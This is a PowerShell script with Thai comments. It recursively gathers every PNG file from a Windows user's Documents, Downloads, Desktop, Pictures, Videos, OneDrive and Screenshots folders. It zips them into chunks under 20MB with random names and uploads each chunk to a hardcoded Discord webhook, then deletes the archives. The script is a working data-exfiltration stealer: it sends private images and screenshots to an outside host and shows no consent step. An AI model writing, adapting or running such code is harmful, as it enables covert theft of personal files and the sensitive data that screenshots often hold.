# Path ที่จะสแกนไฟล์ (เพิ่ม OneDrive และโฟลเดอร์ Screenshots)
$folders = @(
    "$env:USERPROFILE\Documents", 
    "$env:USERPROFILE\Downloads", 
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\Pictures", 
    "$env:USERPROFILE\Videos", 
    "C:\Users\Lenovo\OneDrive",
    "C:\Users\Lenovo\OneDrive\รูปภาพ\Screenshots"
)

# เพิ่มนามสกุลไฟล์ที่ต้องการ
$extensions = @("*.png")

# สร้างโฟลเดอร์ชั่วคราวสำหรับเก็บไฟล์ที่คัดลอกมา
$zipFolder = "$env:TEMP\collected_files"
New-Item -ItemType Directory -Force -Path $zipFolder

# คัดลอกไฟล์ที่ต้องการมาไว้ในโฟลเดอร์ชั่วคราว
foreach ($folder in $folders) {
    foreach ($ext in $extensions) {
        Get-ChildItem -Path $folder -Filter $ext -Recurse -ErrorAction SilentlyContinue | Copy-Item -Destination $zipFolder -Force
    }
}

# สร้าง ZIP ไฟล์จากโฟลเดอร์ที่รวบรวมไฟล์ และแยกไฟล์ถ้าเกิน 20MB
$maxSize = 20MB
$zipFiles = @()

Add-Type -AssemblyName 'System.IO.Compression.FileSystem'
$zipIndex = 1
$chunkFolder = "$env:TEMP\chunk_$zipIndex"
New-Item -ItemType Directory -Force -Path $chunkFolder

$copiedSize = 0
foreach ($file in Get-ChildItem -Path $zipFolder) {
    $fileSize = (Get-Item $file.FullName).length
    if (($copiedSize + $fileSize) -gt $maxSize) {
        # Create zip for the current chunk
        $randomName = [guid]::NewGuid().ToString() + ".zip"
        $zipPath = Join-Path -Path $env:TEMP -ChildPath $randomName
        [System.IO.Compression.ZipFile]::CreateFromDirectory($chunkFolder, $zipPath)
        $zipFiles += $zipPath

        # Start a new chunk
        $copiedSize = 0
        $zipIndex++
        $chunkFolder = "$env:TEMP\chunk_$zipIndex"
        New-Item -ItemType Directory -Force -Path $chunkFolder
    }
    Copy-Item -Path $file.FullName -Destination $chunkFolder -Force
    $copiedSize += $fileSize
}

# Create final zip if remaining files
if ((Get-ChildItem -Path $chunkFolder | Measure-Object).Count -gt 0) {
    $randomName = [guid]::NewGuid().ToString() + ".zip"
    $zipPath = Join-Path -Path $env:TEMP -ChildPath $randomName
    [System.IO.Compression.ZipFile]::CreateFromDirectory($chunkFolder, $zipPath)
    $zipFiles += $zipPath
}


# สร้างเนื้อหา multipart สำหรับส่งไฟล์
$webhookUrl = "https://discord.com/api/webhooks/1298992670655643710/bXqKu7T9se4J_mUBeOpcur3Uso7A3fAF26vWVG9Zjweq3LanK6_pTXvCgc1TZgSks6ey"
foreach ($zipFile in $zipFiles) {
    $boundary = [System.Guid]::NewGuid().ToString()
    $header = @{
        "Content-Type" = "multipart/form-data; boundary=$boundary"
    }

    # สร้างเนื้อหา multipart สำหรับส่งไฟล์
    $body = @"
--$boundary
Content-Disposition: form-data; name="payload_json"

{ "content": "ไฟล์จาก PowerShell Script", "embeds": [ { "title": "T001", "description": "ไฟล์ที่รวบรวม" } ] }
--$boundary
Content-Disposition: form-data; name="file"; filename="files.zip"
Content-Type: application/zip

$(Get-Content -Raw -Path $zipFile)
--$boundary--
"@

    # ส่งคำขอไปยัง Discord webhook
    $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $header -Body $body

    # แสดงผลลัพธ์
    $response

    # ลบไฟล์ชั่วคราวหลังจากส่งเสร็จ
    Remove-Item -Force $zipFile
}

# ลบไฟล์และโฟลเดอร์ชั่วคราว
